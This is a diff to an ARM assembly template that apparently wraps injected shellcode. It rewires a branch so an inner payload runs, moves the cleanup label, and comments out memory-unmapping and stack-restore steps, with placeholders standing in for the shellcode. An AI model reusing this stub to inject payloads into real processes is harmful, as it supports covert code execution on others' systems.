@@ -55,11 +55,11 @@ wait_for_script:
 
 	ldr r7, [r12]
 	cmp r7, r8
-	beq cleanup_and_return
+	beq execute_inner_payload
 	
 	b wait_for_script
 
-cleanup_and_return:
+execute_inner_payload:
 	
 	// save any necessary register values before running the inner payload
 	push {r11}
@@ -67,29 +67,33 @@ cleanup_and_return:
 	
 	[VARIABLE:SHELLCODE_SOURCE:VARIABLE]
 
+cleanup_and_return:
+
 	// restore the register values now that the inner payload has finished
 	pop {r10}
 	pop {r11}
 
 	// de-allocate the mmapped r/w block
-	mov r7, #91             					@ SYS_MUNMAP
-	mov r0, r11	            					@ addr
-	mov r1, #[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]  	@ len
-	swi 0x0										@ syscall
+	//mov r7, #91             					@ SYS_MUNMAP
+	//mov r0, r11	            					@ addr
+	//mov r1, #[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]  	@ len
+	//swi 0x0										@ syscall
 		
 	// cannot really de-allocate the r/x block because that is where this code is
-	
+
+[DEALLOCATE_MEMORY]
+
 	// restore registers
 	//sub sp, r6, #0x4
 	ldmia sp!, {r0-r11}
 
 	// restore stack pointer
 	//ldr r0, [pc]
-	b restoreStackPointer2
+	//b restoreStackPointer2
 	
-old_stack_pointer:
-	.word [VARIABLE:STACK_POINTER:VARIABLE]
-	.balign 4
+//old_stack_pointer:
+//	.word [VARIABLE:STACK_POINTER:VARIABLE]
+//	.balign 4
 
 restoreStackPointer2:	
 	
